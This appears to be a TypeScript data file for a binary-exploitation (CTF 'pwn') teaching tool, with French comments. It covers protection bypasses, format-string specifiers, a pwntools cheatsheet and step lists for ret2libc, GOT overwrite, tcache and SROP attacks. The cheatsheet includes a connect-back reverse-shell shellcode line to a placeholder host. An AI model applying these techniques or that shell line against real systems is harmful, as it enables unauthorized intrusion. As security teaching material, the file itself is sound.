/** Exploitation / Pwn mode reference data */

export interface PwnTechnique {
  name: string
  desc: string
  steps: string[]
}

export interface ShellcodeTemplate {
  name: string
  arch: string
  desc: string
  code: string[]
}

export interface FormatStringRef {
  specifier: string
  effect: string
  example: string
}

export interface ProtectionBypass {
  protection: string
  what: string
  bypass: string[]
}

export const PROTECTIONS: ProtectionBypass[] = [
  {
    protection: 'NX (No-Execute)',
    what: 'Stack/heap non-executable. DEP sous Windows.',
    bypass: ['ROP (Return-Oriented Programming)', 'ret2libc — retourner a system() ou execve()', 'ret2plt — sauter a une entree PLT', 'JIT spray (si moteur JIT present)'],
  },
  {
    protection: 'ASLR',
    what: 'Randomisation des adresses de la stack, heap, libs.',
    bypass: ['Info leak — fuiter une adresse libc/stack', 'Brute force (32-bit seulement, ~4096 essais)', 'Partial overwrite (ecraser les 1-2 derniers octets)', 'Format string pour lire la stack', 'ret2plt (PLT non randomisee si pas PIE)'],
  },
  {
    protection: 'Stack Canary',
    what: 'Valeur aleatoire avant le return address. Detecte les overflows.',
    bypass: ['Fuiter le canary (format string, info leak)', 'Ecraser byte par byte (fork server)', 'Overwrite via index out-of-bounds (sauter le canary)', 'Overwrite GOT/hook au lieu du return addr'],
  },
  {
    protection: 'PIE (Position Independent)',
    what: 'Le binaire lui-meme est randomise (base variable).',
    bypass: ['Fuiter une adresse du binaire', 'Partial overwrite (octets bas stables)', 'Brute force ASLR (binaires < 4K pages)'],
  },
  {
    protection: 'RELRO (Full)',
    what: 'GOT en lecture seule apres initialisation.',
    bypass: ['Overwrite __malloc_hook, __free_hook', 'Overwrite .fini_array', 'Overwrite stack (ROP)'],
  },
  {
    protection: 'RELRO (Partial)',
    what: 'GOT.PLT toujours writable pour lazy binding.',
    bypass: ['GOT overwrite direct', 'Ecraser une entree GOT avec system()'],
  },
  {
    protection: 'Seccomp / Sandbox',
    what: 'Filtre de syscalls (BPF).',
    bypass: ['seccomp-tools dump pour analyser les regles', 'ORW (open-read-write) si autorises', 'Utiliser des syscalls alternatifs (openat, sendfile)', 'Attaquer le filtre lui-meme (si mal configure)'],
  },
]

export const FORMAT_STRING_REF: FormatStringRef[] = [
  { specifier: '%p', effect: 'Lit un pointeur sur la stack (leak)', example: 'printf("%p.%p.%p.%p") → leak stack' },
  { specifier: '%x', effect: 'Lit un int hex sur la stack', example: 'printf("%08x.%08x") → leak 4 octets' },
  { specifier: '%s', effect: 'Lit une string a l\'adresse sur la stack', example: 'printf("%s") avec ptr valide → leak string' },
  { specifier: '%n', effect: 'Ecrit le nombre de chars imprimes a l\'adresse', example: '%n ecrit 4 octets, %hn 2, %hhn 1' },
  { specifier: '%N$p', effect: 'Acces direct au N-ieme argument', example: '%6$p → lit le 6e arg sur la stack' },
  { specifier: '%N$n', effect: 'Ecrit au N-ieme argument', example: '%6$n → ecrit a l\'adresse du 6e arg' },
  { specifier: '%Nc', effect: 'Pad de N caracteres (pour controler %n)', example: '%64c%7$hhn → ecrit 0x40 au 7e arg' },
  { specifier: '%*N$c', effect: 'Pad avec la valeur du N-ieme arg', example: 'Utile pour ecrire des valeurs dynamiques' },
]

export const PWNTOOLS_CHEATSHEET = [
  {
    name: 'Connexion',
    code: [
      "from pwn import *",
      "p = process('./vuln')            # local",
      "p = remote('host', 1337)         # distant",
      "p = gdb.debug('./vuln', 'b main') # avec GDB",
    ],
  },
  {
    name: 'I/O',
    code: [
      "p.sendline(b'AAAA')             # envoie + newline",
      "p.send(b'\\x41\\x42')              # envoie brut",
      "p.sendafter(b'> ', payload)      # attend prompt puis envoie",
      "data = p.recvline()              # recoit une ligne",
      "data = p.recvuntil(b'> ')        # recoit jusqu'au delimiteur",
      "leak = p.recv(8)                 # recoit N octets",
      "p.interactive()                  # mode interactif",
    ],
  },
  {
    name: 'Packing',
    code: [
      "p64(0xdeadbeef)                  # pack 64-bit LE",
      "p32(0x41414141)                  # pack 32-bit LE",
      "u64(leak.ljust(8, b'\\x00'))      # unpack 64-bit",
      "u32(leak[:4])                    # unpack 32-bit",
      "flat([0x401234, 0, buf])         # concat pack",
    ],
  },
  {
    name: 'ELF & Symbols',
    code: [
      "elf = ELF('./vuln')",
      "elf.symbols['main']              # adresse de main",
      "elf.plt['puts']                  # adresse PLT puts",
      "elf.got['puts']                  # adresse GOT puts",
      "elf.address = 0x400000           # set base address",
      "libc = ELF('./libc.so.6')",
      "libc.symbols['system']           # offset system",
      "next(libc.search(b'/bin/sh'))    # offset /bin/sh",
    ],
  },
  {
    name: 'ROP',
    code: [
      "rop = ROP(elf)",
      "rop.call('puts', [elf.got['puts']]) # appel puts(GOT)",
      "rop.raw(pop_rdi)                 # gadget brut",
      "rop.chain()                      # genere le payload",
      "# gadgets utiles:",
      "pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]",
      "ret = rop.find_gadget(['ret'])[0]  # stack align",
    ],
  },
  {
    name: 'Cyclic',
    code: [
      "cyclic(200)                      # genere pattern",
      "cyclic_find(0x61616168)          # trouve l'offset",
      "# equivalent: cyclic -l 0x61616168",
    ],
  },
  {
    name: 'Shellcraft',
    code: [
      "shellcode = asm(shellcraft.sh())        # /bin/sh",
      "shellcode = asm(shellcraft.cat('flag'))  # cat flag",
      "shellcode = asm(shellcraft.connect('ip', port) + shellcraft.dupsh())",
      "# context:",
      "context.arch = 'amd64'",
      "context.os = 'linux'",
      "context.log_level = 'debug'",
    ],
  },
]

export const PWN_TECHNIQUES: PwnTechnique[] = [
  {
    name: 'ret2libc',
    desc: 'Bypass NX en retournant dans la libc. Necessite un leak libc.',
    steps: [
      '1. Trouver l\'offset du buffer overflow (cyclic)',
      '2. Leak une adresse libc (puts(GOT) via ROP)',
      '3. Calculer libc base: leak - libc.symbols["puts"]',
      '4. Construire ROP: pop rdi → "/bin/sh" → system()',
      '5. Ajouter un gadget "ret" avant system() pour aligner la stack',
    ],
  },
  {
    name: 'GOT Overwrite',
    desc: 'Ecraser une entree GOT pour detourner un appel de fonction.',
    steps: [
      '1. Identifier une fonction appelee apres le write (puts, printf...)',
      '2. Calculer l\'adresse de sa GOT entry',
      '3. Ecraser avec l\'adresse de system() ou win()',
      '4. Le prochain appel a la fonction executera notre cible',
    ],
  },
  {
    name: 'Format String Attack',
    desc: 'Exploiter printf(user_input) pour lire/ecrire la memoire.',
    steps: [
      '1. Trouver l\'offset de votre input sur la stack (%p%p%p...)',
      '2. Pour leak: %N$p lit le N-ieme argument',
      '3. Pour write: placer l\'adresse cible dans l\'input',
      '4. Utiliser %N$n pour ecrire a cette adresse',
      '5. pwntools: fmtstr_payload(offset, {addr: value})',
    ],
  },
  {
    name: 'Heap Exploitation (tcache)',
    desc: 'Exploiter le tcache pour obtenir un write-what-where.',
    steps: [
      '1. Free un chunk 2 fois (double-free tcache)',
      '2. Allouer, ecrire l\'adresse cible dans fd',
      '3. Allouer 2 fois → le 2e malloc retourne l\'adresse cible',
      '4. Ecrire a l\'adresse cible (ex: __free_hook → system)',
      '5. Variantes: tcache poisoning, house of force, house of spirit',
    ],
  },
  {
    name: 'Stack Pivot',
    desc: 'Deplacer RSP vers un buffer controle pour plus d\'espace ROP.',
    steps: [
      '1. Trouver un gadget "leave; ret" ou "xchg rsp, rax; ret"',
      '2. Ecrire le ROP chain dans un buffer connu (bss, heap)',
      '3. Mettre l\'adresse du buffer -8 dans RBP',
      '4. Le leave (mov rsp,rbp; pop rbp) pivote la stack',
      '5. Le ret continue l\'execution dans le buffer',
    ],
  },
  {
    name: 'SROP (Sigreturn ROP)',
    desc: 'Utiliser sigreturn pour controler tous les registres d\'un coup.',
    steps: [
      '1. Construire un SigreturnFrame avec les registres desires',
      '2. frame.rax = 59 (execve), frame.rdi = "/bin/sh"...',
      '3. ROP: mov rax, 15 → syscall (sigreturn)',
      '4. Le kernel restaure les registres depuis la frame',
      '5. pwntools: SigreturnFrame(kernel="amd64")',
    ],
  },
]
